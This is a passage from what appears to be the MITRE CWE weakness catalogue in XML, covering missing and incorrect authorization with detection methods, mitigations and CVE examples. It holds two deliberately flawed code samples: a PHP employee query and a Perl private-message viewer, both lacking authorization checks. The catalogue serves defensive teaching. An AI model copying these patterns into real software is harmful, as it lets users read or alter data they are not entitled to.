            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</xhtml:p>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:1em;">mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:br/>
                        <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                        <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>/.../</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:1em;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:br/>
                     <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24730</Reference>
               <Description>Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2005-1036</Reference>
	     <Description>Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2005-1036</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-17533</Reference>
               <Description>Chain: unchecked return value (CWE-252) of some functions for policy enforcement leads to authorization bypass (CWE-862)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-17533</Link>
            </Observed_Example>
         </Observed_Examples>
	 <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-1</Entry_ID>
	     <Entry_Name>Req 4.3.3.7</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
	     <Entry_Name>Req SR 2.1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 2.1</Entry_Name>
	   </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="665"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-05-24</Submission_Date>
               <Submission_Version>1.13</Submission_Version>
               <Submission_ReleaseDate>2011-06-01</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="863" Name="Incorrect Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
